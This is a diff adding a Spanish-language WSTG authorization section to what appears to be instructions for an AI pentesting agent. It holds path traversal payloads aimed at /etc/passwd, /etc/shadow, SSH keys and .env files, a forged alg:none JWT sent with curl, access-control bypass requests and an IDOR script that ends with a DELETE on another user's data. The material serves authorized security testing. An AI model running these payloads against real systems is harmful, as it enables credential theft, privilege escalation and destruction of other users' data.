@@ -10,10 +10,234 @@ Especialista en escalada de privilegios y controles de acceso.
 - Puede solicitar ayuda del humano para ajecutar pruebas
 - Evaluar siempre el tipo de activo antes de ejecutar las pruebas.
 - Adapta las variables de las pruebas un funcion del activo evaluado. Sino tienen informacion solicitalas al humano.
-- Adapta las herramientas conforme el acontexto
+- Adapta las herramientas conforme el acontexto.
 
 ## BIBLIOTECA TÉCNICA (Sección 4.5 - Autorización)
+============================================================
+AUTORIZACION (WSTG 4.5)
+============================================================
 
+Autorizacion (WSTG 4.5)
+
+4.5.1 Directory Traversal (WSTG-ATHZ-01)
+
+Payloads de path traversal por sistema operativo:
+
+------------------------------------------------------------
+  Payload                               Descripcion
+  ------------------------------------- ------------------------------------------------
+  ../../../etc/passwd                   Linux - lectura de usuarios del sistema
+
+  ..\..\..\windows\win.ini              Windows - archivo de configuracion del sistema
+
+  ....//....//....//etc/passwd          Doble codificacion, bypass de filtros simples
+
+  %2e%2e%2f%2e%2e%2fetc%2fpasswd        URL encoding del traversal
+
+  %252e%252e%252fetc%252fpasswd         Doble URL encoding
+
+  ..%c0%af..%c0%afetc%c0%afpasswd       Codificacion UTF-8 no estandar (bypass IIS)
+
+  ....\\....\\etc/passwd                Mixed slashes para bypass
+
+  /var/www/images/../../../etc/passwd   Traversal con ruta absoluta
+
+  ....%2F....%2Fetc%2Fpasswd            Encoded slash con puntos duplicados
+------------------------------------------------------------
+
+Ejemplo de prueba en parametro de descarga:
+
+------------------------------------------------------------
+  # Parametro vulnerable:
+------------------------------------------------------------
+  GET /download?file=invoice_001.pdf HTTP/1.1
+
+  # Payload de traversal:
+
+  GET /download?file=../../../etc/passwd HTTP/1.1
+
+  # Respuesta si vulnerable:
+
+  HTTP/1.1 200 OK
+
+  root:x:0:0:root:/root:/bin/bash
+
+  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+
+  ...
+
+  # Archivos de alto valor en Linux:
+
+  /etc/passwd            /etc/shadow      /etc/hosts
+
+  /proc/self/environ     /proc/self/cmdline
+
+  /var/log/apache2/access.log            # log poisoning -> RCE
+
+  /home/www-data/.ssh/id_rsa             # clave SSH privada
+
+  /var/www/html/.env                     # configuracion de la app
+------------------------------------------------------------
+
+4.5.2 Bypass de Autorizacion (WSTG-ATHZ-02)
+
+Bypass horizontal — acceder a recursos de otro usuario:
+
+------------------------------------------------------------
+  # Autenticado como usuario ID=100
+------------------------------------------------------------
+  GET /api/users/100/invoices  Authorization: Bearer eyJ...(token de user 100)
+
+  HTTP/1.1 200 OK => Lista de facturas de user 100
+
+  # Cambiar ID por el de otro usuario:
+
+  GET /api/users/101/invoices  Authorization: Bearer eyJ...(token de user 100)
+
+  # Si responde 200 con datos de user 101 => CRITICO: IDOR/Broken Auth
+------------------------------------------------------------
+
+Bypass vertical — escalar a admin:
+
+------------------------------------------------------------
+  # JWT con rol 'user':
+------------------------------------------------------------
+  eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
+
+  .eyJ1c2VyX2lkIjoxMDAsInJvbGUiOiJ1c2VyIn0
+
+  .HMAC_SIGNATURE
+
+  # Payload decodificado: {"user_id":100, "role":"user"}
+
+  # Modificar payload: {"user_id":100, "role":"admin"}
+
+  # Ataque 'alg:none' (si el servidor acepta algoritmo none):
+
+  eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0
+
+  .eyJ1c2VyX2lkIjoxMDAsInJvbGUiOiJhZG1pbiJ9
+
+  .
+
+  curl -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyX2lkIjoxMDAsInJvbGUiOiJhZG1pbiJ9.' \
+
+      https://objetivo.com/admin/users
+
+  => CRITICO si funciona: servidor acepta JWT sin firma
+------------------------------------------------------------
+
+Manipulacion de parametros de autorizacion:
+
+------------------------------------------------------------
+  # Cambiar parametro de rol en request:
+------------------------------------------------------------
+  POST /update-profile
+
+  {"name": "John", "email": "john@test.com", "role": "admin"}
+
+  # Si el servidor acepta el campo 'role' del cliente => Mass Assignment
+
+  # Bypass via path alternativo:
+
+  GET /admin/users       => 403 Forbidden
+
+  GET /Admin/users       => 200 OK (case-sensitive bypass)
+
+  GET /admin/users/      => 200 OK (trailing slash bypass)
+
+  GET /admin;/users      => 200 OK (semicolon injection en Spring)
+
+  GET /api/v1/../admin/users => 200 OK (path normalization bypass)
+------------------------------------------------------------
+
+4.5.4 IDOR (WSTG-ATHZ-04)
+
+Metodologia completa de IDOR con OpenClaw:
+
+------------------------------------------------------------
+  # Paso 1: Autenticarse como Usuario A (ID=100)
+------------------------------------------------------------
+  token_A=$(curl -s -X POST https://objetivo.com/login \
+
+          -d 'user=userA&pass=passA' | jq -r .token)
+
+  # Paso 2: Obtener lista de recursos de A
+
+  curl -H "Authorization: Bearer $token_A" \
+
+      https://objetivo.com/api/invoices
+
+  # Resultado: [{"id":1001}, {"id":1002}, {"id":1003}]
+
+  # Paso 3: Autenticarse como Usuario B (ID=200)
+
+  token_B=$(curl -s -X POST https://objetivo.com/login \
+
+          -d 'user=userB&pass=passB' | jq -r .token)
+
+  # Paso 4: Con token de B, intentar acceder a recursos de A
+
+  curl -H "Authorization: Bearer $token_B" \
+
+      https://objetivo.com/api/invoices/1001
+
+  # Resultado esperado (seguro): HTTP 403 Forbidden
+
+  # Resultado vulnerable: HTTP 200 OK + datos de la factura de A
+
+  # Paso 5: Escalar — intentar operaciones destructivas
+
+  curl -X DELETE -H "Authorization: Bearer $token_B" \
+
+      https://objetivo.com/api/invoices/1001
+
+  # Si borra la factura de A => CRITICO
+------------------------------------------------------------
+
+IDOR en parametros no obvios:
+
+------------------------------------------------------------
+  # IDs en base64
+------------------------------------------------------------
+  GET /api/document?id=MTAwMQ==   # MTAwMQ== = base64('1001')
+
+  # Probar: base64('1002') = MTAwMg==
+
+  # IDs en hash MD5 secuencial (anti-pattern comun)
+
+  GET /api/user/5f4dcc3b5aa765d61d8327deb882cf99
+
+  # MD5('password') => usuario nombrado 'password'? No
+
+  # MD5('1'), MD5('2')... enumerar
+
+  # IDOR en nombre de archivo de descarga
+
+  GET /download/user_100_report.pdf
+
+  # Probar: GET /download/user_101_report.pdf
+
+  # IDOR en referencia indirecta (GUID)
+
+  GET /api/orders/f47ac10b-58cc-4372-a567-0e02b2c3d479
+
+  # GUIDs v1 son predecibles por timestamp => herramienta: guid-utils
+------------------------------------------------------------
+
+CHECKLIST — Autorizacion
+
+------------------------------------------------------------
+  ID        Prueba                    Objetivo                                    Tool / OpenClaw
+  --------- ------------------------- ------------------------------------------- ------------------------
+  ATHZ-01   Directory Traversal       Sin lectura de archivos fuera del webroot   Traversal payloads
+
+  ATHZ-02   Bypass de autorizacion    Sin acceso a recursos no permitidos         Role manipulation
+
+  ATHZ-03   Escalada de privilegios   Sin elevacion horizontal ni vertical        JWT / cookie tampering
+
+  ATHZ-04   IDOR                      IDs verificados por ownership en servidor   Cross-user ID test
+------------------------------------------------------------
 
 ## Entregables
 1. **Informe Breve:** Fallo de control de acceso lógico.
